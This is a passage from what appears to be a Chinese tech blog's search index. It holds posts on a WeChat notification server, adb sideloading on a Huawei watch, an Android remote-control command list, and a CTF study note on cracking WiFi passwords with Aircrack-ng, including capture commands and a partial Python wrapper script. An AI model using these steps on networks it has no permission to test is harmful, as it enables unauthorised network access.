class="line">    set_audio_mode    Set Ringer Mode</span><br><span class="line">    sqlite_query      Query a SQLite database from storage</span><br><span class="line">    wakelock          Enable/Disable Wakelock</span><br><span class="line">    wlan_geolocate    Get current lat-long using WLAN information</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Application Controller Commands</span><br><span class="line">===============================</span><br><span class="line"></span><br><span class="line">    Command        Description</span><br><span class="line">    -------        -----------</span><br><span class="line">    app_install    Request to install apk file</span><br><span class="line">    app_list       List installed apps in the device</span><br><span class="line">    app_run        Start Main Activty for package name</span><br><span class="line">    app_uninstall  Request to uninstall application</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Railway服务平台和message-pusher项目搭建自己的微信通知推送服务器</title>
      <link href="/posts/Custom-Wechat-Pusher/"/>
      <url>/posts/Custom-Wechat-Pusher/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>相信大家现在在用的微信推送平台都是什么方糖QQ的server酱（<a href="https://sct.ftqq.com/">Server酱·Turbo版 (ftqq.com)</a>）又或者是什么PushPlus之类的，我自己用的是server酱，但是在使用过程中发现一个问题：它每天只能推5条消息</p><p>对于我这种拿另一个手机使用SMSForwarder（<a href="https://github.com/pppscn/SmsForwarder">pppscn&#x2F;SmsForwarder: 短信转发器 (github.com)</a>）来转发短信的人来说，一天接到的验证码短信肯定不只5条，虽然配置了邮件转发，但是有的时候QQ的smtp服务器抽风，而且邮件不如微信好用，所以我就在想能不能搭建一个自己的推送服务器</p><p>恰巧我之前看到过<a href="https://github.com/songquanpeng/message-pusher">songquanpeng&#x2F;message-pusher: 搭建专属于你的微信消息推送服务 (github.com)</a>这个项目，因为文档里面说可以部署在heroku上面，我就干起来了</p><hr><div class="note info flat"><p>本次使用到的项目以及平台：</p><p><a href="https://github.com/pppscn/SmsForwarder">pppscn&#x2F;SmsForwarder: 短信转发器 (github.com)</a></p><p><a href="https://github.com/songquanpeng/message-pusher">songquanpeng&#x2F;message-pusher: 搭建专属于你的微信消息推送服务 (github.com)</a></p><p><a href="https://railway.app/?referralCode=U8coe_">Railway.app 服务部署平台</a></p></div><p>因为Heroku一旦休眠再开启后，数据会丢失（虽然message-pusher的作者用了环境变量的方式去存储数据，但是这还是不太方便），恰巧railway也是一个可以部署服务的平台，相较于heroku主要是按需付费（前5刀免费），而且没有休眠，我就选择了railway</p><p>先fork一下message-pusher这个项目，然后转到railway平台新建项目</p><p>因为我这里想部署在原来就有的项目下面，所以我直接进入到项目之中，点击右上角的<code>New</code>，选到我刚刚fork的仓库</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Custom-Wechat-Pusher/msedge-20220601-224438.png"></p><p>选择后，进入到服务的Variables里面添加我们需要的变量</p><p>这里项目作者整理了一个表格来给出我们所需要填写的变量名以及内容</p><table><thead><tr><th>KEY</th><th>VALUE</th></tr></thead><tbody><tr><td>MODE</td><td>1（1 代表 Heroku 模式，该模式下应用从环境变量中读取必要信息）</td></tr><tr><td>PREFIX</td><td>你的前缀，如 admin（前缀用于区分用户，出现在请求的 api 路径中）</td></tr><tr><td>DEFAULT_METHOD</td><td>默认推送方式（test 代表微信测试号，corp 代表微信企业号，email 代表邮件推送，client 代表客户端推送）</td></tr><tr><td>HREF</td><td>服务的 href，如 <a href="https://wechat-message.herokuapp.com/">https://wechat-message.herokuapp.com/</a> ，注意后面要有 &#x2F;</td></tr><tr><td>ACCESS_TOKEN</td><td>用于验证调用者身份，防止别人使用借口发送垃圾信息，置空则不进行检查，设置该值后则需要在调用时加上 token 字段</td></tr><tr><td>WECHAT_APP_ID</td><td>你的测试号的 APP ID</td></tr><tr><td>WECHAT_APP_SECRET</td><td>你的测试号的 APP Secret</td></tr><tr><td>WECHAT_TEMPLATE_ID</td><td>你的测试号的模板消息的 ID</td></tr><tr><td>WECHAT_OPEN_ID</td><td>你的 Open ID</td></tr><tr><td>WECHAT_VERIFY_TOKEN</td><td>你自己设置的验证 token</td></tr><tr><td>EMAIL</td><td>你的默认目标邮箱</td></tr><tr><td>SMTP_SERVER</td><td>smtp 服务器地址，如 smtp.qq.com</td></tr><tr><td>SMTP_USER</td><td>smtp 服务器用户邮箱</td></tr><tr><td>SMTP_PASS</td><td>smtp 服务器用户凭据</td></tr><tr><td>CORP_ID</td><td>微信企业号 ID</td></tr><tr><td>CORP_AGENT_ID</td><td>微信企业号应用 ID</td></tr><tr><td>CORP_APP_SECRET</td><td>微信企业号应用 Secret</td></tr><tr><td>CORP_USER_ID</td><td>微信企业号用户 ID</td></tr></tbody></table><p>因为Railway跟Heroku相似，都是服务部署平台，所以这里我<code>MODE</code>我填写的是<code>1</code>（但是其实好像0也可以，因为Railway不需要把数据存在变量中。如果选择的是<code>0</code>的话可以不填其他的设置，直接在网页控制台里面修改就行了，但是我选的是<code>1</code>，所以我就把其他的也填了）</p><p><code>PREFIX</code> 是控制台以及发送通知访问的路径，我就直接保留默认了</p><p><code>HREF</code> 是项目的访问地址，主要用于给出微信测试平台与我们项目对接的链接，直接填写自己的服务访问链接就可以了</p><p><code>WECHAT_APP_ID</code> <code>WECHAT_APP_SECRET</code> 是测试号的信息，我们可以在<a href="https://mp.weixin.qq.com/debug/cgi-bin/sandboxinfo?action=showinfo&t=sandbox/index">微信公众平台 (qq.com)</a>拿到我们需要的内容</p><p><code>WECHAT_OPEN_ID</code> <code>WECHAT_VERIFY_TOKEN</code> 在后面跟公众号平台对接的时候使用，这两个后面再讲</p><p>我用到的就是这些，你也可以按照需要自己填写</p><p>填写完了以后随便切出<code>Variables</code>页面，Railway会自动开始重新部署</p><p>部署完成后访问Railway提供的域名，我们就能够进入管理平台的登录页面</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Custom-Wechat-Pusher/msedge-20220601-223424.png"></p><p>（我这里登陆过了所以上面显示的按钮是<code>添加新用户</code> <code>配置</code> 和 <code>退出</code>）</p><p>登录的用户名和密码默认分别为<code>admin</code>和<code>123456</code>，登录进入以后一定要先改密码</p><hr><p>接下来我们进行服务的配置，先点击用户设置，在这里先更改自己的登录密码，以及选择自己需要发送的通道（因为我用的是微信的测试号，所以我填的是<code>test</code>，下面我也主要会以微信测试号来说明）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Custom-Wechat-Pusher/msedge-20220601-225159.png"></p><p><code>ACCESS TOKEN</code>可填可不填，主要看个人需求，如果需要鉴权的话就填一个吧</p><p>接下来我们转到顶上的微信测试号设置，在这里填写我们在<a href="https://mp.weixin.qq.com/debug/cgi-bin/sandboxinfo?action=showinfo&t=sandbox/index">微信公众平台 (qq.com)</a>里面拿到的<code>APP ID</code>和<code>APP SECRET</code></p><p>在微信公众平台，我们在下面模板信息接口新建一个测试模板，按照自己的需求填写，就可以拿到模板ID（<code>TEMPLATE ID</code>）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Custom-Wechat-Pusher/msedge-20220601-225541.png"></p><p>然后我们先把这里的TOKEN设置好，点击一次提交先（TOKEN是自己设置的，用于微信公众平台对接）</p><p>接下来我们转到微信公众平台，在<code>接口配置信息</code>里面，<code>URL</code>就填配置页面上面的灰框框给出的链接，<code>Token</code>就填写刚刚自己设置的内容，然后打开开发者平台，在网络(Network)选项卡中稍等一会，会弹微信自己向服务器发送测试号粉丝（即关注了测试号的用户）的列表，在这里面你可以找到你自己的微信，并且把<code>OPEN_ID</code>弄到手（如果你没有关注自己的测试号，这里是不会显示自己的信息的，你需要往下拉找到自己的二维码先关注）</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Custom-Wechat-Pusher/msedge-20220601-225903.png"></p><p>填写好微信公众平台的<code>URL</code>和<code>Token</code>以后，可以点击提交（可能会成功，反正我没成功，但是不影响使用）</p><p>我们返回配置页面，在<code>OPEN ID</code>里面填入我们自己的ID，然后点击提交就可以了</p><p>这时候我们尝试访问<code>https://&lt;你的域名&gt;/&lt;你的路径&gt;/hi</code>，如果返回<code>&#123;&quot;success&quot;:true,&quot;message&quot;:&quot;ok&quot;&#125;</code>就说明发送成功了，你也可以在手机上查看自己收到的信息</p><hr><p>一开始我就说了我是用来转发短信的，所以自然要与短信转发器对接（因为我手机不在手上，所以下面我使用Teamviewer进行远程控制）</p><p>先新建一条转发通道，名字随意，请求方式按需选择，我这里用GET主要是方便</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Custom-Wechat-Pusher/TeamViewer-20220601-230541.png"></p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Custom-Wechat-Pusher/TeamViewer-20220601-230649.png"></p><p><code>WebParams</code>里面的参数根据自己需求填写，我这里写的是<code>title=来自[from]的短信&amp;description=[content]&amp;content=[content]</code>，然后前往转发规则，新建一条转发规则，根据自己的需求填写</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Custom-Wechat-Pusher/TeamViewer-20220601-231002.png"></p><p>填写完以后可以测试一下，要是测试没问题保存即可</p><p>附上一张测试成功的样图</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/Custom-Wechat-Pusher/ngkIIFFBPT.png"></p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在华为Watch Pro 3上面安装第三方应用</title>
      <link href="/posts/Install-apk-on-HUAWEI-Watch-Pro-3/"/>
      <url>/posts/Install-apk-on-HUAWEI-Watch-Pro-3/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>我身边老多人用智能手表了，OPPO Watch 2 已经见怪不怪了，这不又来了个HUAWEI Watch Pro 3手表，说请我帮他装点软件。说白了手表装软件不就adb嘛能有啥，既然结了这活，那就干吧（因为忘记拍照了，所以本文应该是全文字）</p><p>华为手表用的是鸿蒙系统，一开始我还在担心会不会没有adb调试的功能，等我按照正常操作（关于，版本号连点5下，开发者选项）后，看到开发者选项里面没有adb调试这个选项，取而代之的是什么HDC调试（我猜是华为自己的一种调试模式），实际测试这个HDC调试跟adb调试好像是一个东西？用abd都能够连接</p><p>使用<code>adb connect ip:port</code>进行连接，我一开始天真的以为直接<code>adb install</code>就可以了，当我这么操作的时候，这傻逼系统告诉我说不允许通过adb安装应用，我翻了翻开发者选项，没有平常的<code>通过adb安装应用</code>的开关，上网搜了一下说<code>com.android.packageinstaller</code>这个应用包会禁止安装应用，所以要先关掉，装完要开回来（不然会变砖头）</p><p>所以就很简单啦，在安装之前我们先关掉这个应用包，安装完后打开即可</p><p>这里有个坑：华为手表连接WIFI会在锁屏的时候自动断开连接，所以搞得我好多次快要装完了，结果一个锁屏GG</p><p>我们可以使用以下命令进行应用的安装</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">adb disconnect</span><br><span class="line">adb connect &lt;手表的IP地址:端口（一般是<span class="number">5555</span>）&gt;</span><br><span class="line">adb shell pm <span class="built_in">disable-user</span> com.android.packageinstaller</span><br><span class="line">adb install &lt;apk路径&gt;</span><br><span class="line">adb shell pm enable com.android.packageinstaller</span><br></pre></td></tr></table></figure><p>安装完后就应该能在手表的启动器中找到安装的应用了。</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF学习笔记（大学篇）04 —— 使用Aircrack-ng来破解WIFI</title>
      <link href="/posts/CTF-in-College-4/"/>
      <url>/posts/CTF-in-College-4/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><div class="note info flat"><p>Aircrack-ng 官网：<a href="https://www.aircrack-ng.org/">https://www.aircrack-ng.org/</a></p></div><p>Aircrack-ng是用来破解WIFI密码的工具，原理就是先寻找要破解的WIFI，然后把设备T下线，伪装成热点，让其他设备连接到伪装热点上获取握手包，最后跑字典把密码跑出来</p><p>说白了就是字典里面如果有就是有，没有那就没戏，所以其实用处嘛……</p><h2 id="Aircrack-Ng-安装"><a href="#Aircrack-Ng-安装" class="headerlink" title="Aircrack-Ng 安装"></a>Aircrack-Ng 安装</h2><p>Kali其实自带了这个东西，但是对于大部分的Linux发行版是不带的，所以我们需要进行安装</p><p>最简单的方式就是直接通过apt进行安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt update</span><br><span class="line">sudo apt install aircrack-ng -y</span><br></pre></td></tr></table></figure><p>我这里因为装过了所以才是这么提示的，如果没装过会进入正常的apt安装流程</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-4/vmware-20220601-163848.png?download=true"></p><h2 id="网卡设置"><a href="#网卡设置" class="headerlink" title="网卡设置"></a>网卡设置</h2><p>我这里自己插了一张AWUS036H网卡（显示为wlan0），某宝从几十块到几百的都有，那我这张自然是白嫖的嘛</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-4/vmware-20220601-164831.png?download=true"></p><p>顺带上一张实物图</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-4/IMG_20220601_164945.jpg"></p><p>要开始使用Aircrack-ng，就需要把网卡设置为监听模式，不过这个设置Aircrack-ng里面有一键化的命令，我们只需要执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng start &lt;网卡名字&gt;</span><br></pre></td></tr></table></figure><p>就可以打开监听模式了，对于我这里，我需要输入的为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airmon-ng start wlan0</span><br></pre></td></tr></table></figure><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-4/vmware-20220601-165742.png"></p><p>（我这里因为开过一次，所以就会有两个进程在用这个网卡，根据它里面所说的用<code>airmon-ng check kill</code>先杀掉相关进程后重新开启就可以了）</p><p>完成后，原网卡的名字后面会多出<code>mon</code>的字样，就像这样</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-4/vmware-20220601-165917.png"></p><h2 id="搜索网络"><a href="#搜索网络" class="headerlink" title="搜索网络"></a>搜索网络</h2><p>使用<code>airodump-ng &lt;网卡名字&gt;</code>可以进入搜索模式</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airodump-ng wlan0mon</span><br></pre></td></tr></table></figure><p>然后会开始搜索附近的WIFI，按两下<kbd>Q</kbd>可以退出搜索</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-4/vmware-20220601-171049.png"></p><p><code>BSSID</code> 是搜索到的WIFI的MAC地址</p><p><code>PWR</code> 不清楚，但是用不到</p><p><code>Beacons</code> 不清楚，但是也用不到</p><p><code>#Data, #/s</code> 数据量（我猜的）</p><p><code>CH</code> 即Channel，WIFI的频道</p><p><code>MB</code> 不清楚，也用不到</p><p><code>ENC CIPHER</code> 加密协议的版本</p><p><code>AUTH</code> 认证方式（PSK即密码）</p><p><code>ESSID</code> WIFI名称</p><p>我们需要记下<code>BSSID</code> <code>CHANNEL</code> 这两个东西，在抓取握手包会用到，记完了以后按两下<kbd>Q</kbd>退出搜索就可以了</p><h2 id="抓取握手包"><a href="#抓取握手包" class="headerlink" title="抓取握手包"></a>抓取握手包</h2><p>使用<code>airodump-ng -w &#123;path&#125; --channel &#123;channel&#125; --bssid &#123;bssid&#125; &#123;netcard&#125;</code>能够抓取握手包</p><p><code>path</code>就是保存文件的路径</p><p><code>channel</code> 频道，上面说过了</p><p><code>bssid</code> WIFI的MAC地址，上面也说过了</p><p><code>netcard</code> 你想使用的网卡</p><p>我这里就直接输入下面这个命令来抓取<code>Raspberry</code>这个WIFI的握手包（Packets文件夹已经提前新建完成）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo airodump-ng -w ./Packets/captured --channel 11 --bssid 5E:E4:2A:0D:4B:75 wlan0mon</span><br></pre></td></tr></table></figure><p>网卡会进入抓取模式，这个过程可以按两下<kbd>Q</kbd>退出抓取</p><p>需要注意的是，抓取过程中，其他设备必须与该WIFI进行至少一次的连接（从不在该网络连接到该网络）</p><p>抓完后，会出现如图的这些文件</p><p><img src="https://cdn.bili33.top/gh/Vikutorika/assets@master/img/CTF-in-College-4/vmware-20220601-172022.png"></p><p>我们要用来破解的就是这个<code>captured-01.cap</code>，至于为什么有01，因为aircrack-ng怕你重名，所以在文件后面会加上数字</p><h2 id="破解WIFI密码"><a href="#破解WIFI密码" class="headerlink" title="破解WIFI密码"></a>破解WIFI密码</h2><p>使用命令<code>aircrack-ng &#123;path&#125; -w &#123;dictionary&#125;</code>来破解WIFI密码</p><p><code>path</code> 是要破解的<code>cap</code>文件的后缀，我这里就应该填<code>./Packets/captured-01.cap</code></p><p><code>dictionary</code> 是要用来破解WIFI跑的字典（字典可以访问<a href="https://gamernotitle.coding.net/p/Dictionarys/d/WIFI/git">代码浏览 - WIFI - 常用字典 - GamerNoTitle的团队 (coding.net)</a>获取）</p><p>组合起来，我这里输入命令（wpa.txt是我电脑里面已经存在的字典）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo aircrack-ng ./Packets/captured-01.<span class="built_in">cap</span> -w wpa.txt</span><br></pre></td></tr></table></figure><p>然后就会开始跑字典，跑完了就会显示了（我这里没有跑，因为太慢了）</p><h2 id="一键化Python程序"><a href="#一键化Python程序" class="headerlink" title="一键化Python程序"></a>一键化Python程序</h2><p>需要记住这么多命令是不是很烦，这里我自己做了个Aircrack-ng的Python程序，来避免记这么多的程序。需要注意：这个程序只能在Linux上运行，并且需要以root权限运行（因为aircrack的大部分命令都需要root权限）</p><p>下面贴出程序，你也可以通过<a href="https://github.com/GamerNoTitle/CTF-Scripts/blob/master/WlanCrack.py">CTF-Scripts&#x2F;WlanCrack.py at master · GamerNoTitle&#x2F;CTF-Scripts (github.com)</a>获取。本程序在字典方面跟我上面的那个coding的库进行了链接，如果没有提供字典的话可以从coding库下载</p><p><strong>需要安装的Python轮子：<code>requests</code> <code>tqdm</code> <code>pprint</code></strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pprint <span class="keyword">import</span> pformat</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"></span><br><span class="line">PreviousOutput = <span class="literal">None</span></span><br><span class="line">output = <span class="literal">None</span></span><br><span class="line">ListeningMode = <span class="literal">False</span></span><br><span class="line">PreviousPath = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ShowNetCard</span>():</span><br><span class="line">    output = os.popen(<span class="string">&#x27;ifconfig&#x27;</span>)</span><br><span class="line">    data = output.read()</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">StartListenerMode</span>(<span class="params">netcard</span>):</span><br><span class="line">    os.system(<span class="string">&#x27;airmon-ng check kill&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">f&#x27;airmon-ng start <span class="subst">&#123;netcard&#125;</span>&#x27;</span>)</span><br><span class="line">    <span class="keyword">global</span> ListeningMode</span><br><span class="line">    ListeningMode = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Started&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">DumpStatus</span>(<span class="params">NetCard</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Double-press Q to exit. When you are ready, press enter.&#x27;</span>)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line">    os.system(<span class="string">f&#x27;airodump-ng <span class="subst">&#123;NetCard&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CapturePacket</span>(<span class="params">channel: <span class="built_in">int</span>, bssid: <span class="built_in">str</span>, netcard: <span class="built_in">str</span>, path=<span class="string">&#x27;./captured&#x27;</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;Double-press Q to exit. When you are ready, press enter.&#x27;</span>)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line">    os.system(</span><br><span class="line">        <span class="string">f&#x27;airodump-ng -w <span class="subst">&#123;path&#125;</span> --channel <span class="subst">&#123;channel&#125;</span> --bssid <span class="subst">&#123;bssid&#125;</span> <span class="subst">&#123;netcard&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">CrackWithDict</span>(<span class="params">path, dictionary</span>):</span><br><span class="line">    os.system(<span class="string">&#x27;airmon-ng check kill&#x27;</span>)</span><br><span class="line">    os.system(<span class="string">f&#x27;aircrack-ng <span class="subst">&#123;path&#125;</span> -w <span class="subst">&#123;dictionary&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Downloader</span>(<span class="params">url: <span class="built_in">str</span>, filename: <span class="built_in">str</span></span>):</span><br><span class="line">    resp = requests.get(url, stream=<span class="literal">True</span>)</span><br><span class="line">    total = <span class="built_in">int</span>(resp.headers.get(<span class="string">&#x27;content-length&#x27;</span>, <span class="number">0</span>))</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filename, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> file, tqdm(</span><br><span class="line">        desc=filename,</span><br><span class="line">        total=total,</span><br><span class="line">        unit=<span class="string">&#x27;iB&#x27;</span>,</span><br><span class="line">        unit_scale=<span class="literal">True</span>,</span><br><span class="line">        unit_divisor=<span class="number">1024</span>,</span><br><span class="line">    ) <span class="keyword">as</span> bar:</span><br><span class="line">        <span class="keyword">for</span> data <span class="keyword">in</span> resp.iter_content(chunk_size=<span class="number">1024</span>):</span><br><span class="line">            size = file.write(data)</span><br><span class="line">            bar.update(size)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">help_msg = <span class="string">&#x27;&#x27;&#x27;&#123;:=^80&#125;</span></span><br><span class="line"><span class="string">[0] Show netcards</span></span><br><span class="line"><span class="string">[1] Start listener</span></span><br><span class="line"><span class="string">[2] Dump wlan status</span></span><br><span class="line"><span class="string">[3] Capture heartbeat packet</span></span><br><span class="line"><span class="string">[4] Crack the packet with a dictionary</span></span><br><span class="line"><span class="string">[9] Install aircrack-ng (If you haven\&#x27;t install it on your computer)</span></span><br><span class="line"><span class="string">[q] Exit</span></span><br><span class="line"><span class="string">&#123;:=^80&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>.<span class="built_in">format</span>(<span class="string">&#x27; Aircrack-Ng Script &#x27;</span>, <span class="string">&#x27; Made by GamerNoTitle &#x27;</span>)</span><br><span class="line"></span><br><span class="line">LogoPrint = <span class="string">r&#x27;&#x27;&#x27;           _                         _           _   _          _____           _       _   </span></span><br><span class="line"><span class="string">     /\   (_)                       | |         | \ | |        / ____|         (_)     | |  </span></span><br><span class="line"><span class="string">    /  \   _ _ __ ___ _ __ __ _  ___| | ________|  \| | __ _  | (___   ___ _ __ _ _ __ | |_ </span></span><br><span class="line"><span class="string">   / /\ \ | | &#x27;__/ __| &#x27;__/ _` |/ __| |/ /______| . ` |/ _` |  \___ \ / __| &#x27;__| | &#x27;_ \| __|</span></span><br><span class="line"><span class="string">  / ____ \| | | | (__| | | (_| | (__|   &lt;       | |\  | (_| |  ____) | (__| |  | | |_) | |_ </span></span><br><span class="line"><span class="string"> /_/    \_\_|_|  \___|_|  \__,_|\___|_|\_\      |_| \_|\__, | |_____/ \___|_|  |_| .__/ \__|</span></span><br><span class="line"><span class="string">                                                        __/ |                    | |        </span></span><br><span class="line"><span class="string">                                                       |___/                     |_|        -- GamerNoTitle &#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(LogoPrint)</span><br><span class="line">    <span class="keyword">if</span> os.geteuid() != <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;You need to run it as root!&#x27;</span>)</span><br><span class="line">        os._exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(help_msg)</span><br><span class="line">        Input = <span class="built_in">input</span>(<span class="string">&#x27;Please choose an option: &#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> Input == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            CardsInfo = ShowNetCard()</span><br><span class="line">        <span class="keyword">if</span> Input == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            Netcard = <span 